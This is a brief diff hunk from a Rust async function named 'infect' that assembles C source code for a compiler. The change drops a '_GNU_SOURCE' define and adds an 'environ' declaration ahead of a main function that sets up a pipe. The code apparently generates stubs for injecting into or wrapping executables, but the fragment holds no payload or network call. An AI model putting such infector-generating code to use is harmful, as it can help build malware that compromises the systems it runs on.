@@ -76,11 +76,11 @@ pub async fn infect<W: AsyncWrite + Unpin>(
 
     compiler
         .add_lines(&[
-            "#define _GNU_SOURCE\n",
             "#include <stdio.h>\n",
             "#include <stdlib.h>\n",
             "#include <unistd.h>\n",
             "#include <sys/wait.h>\n",
+            "extern char **environ;\n",
             "int main(int argc, char** argv) {\n",
             "int pipefd[2];\n",
             "pipe(pipefd);\n",
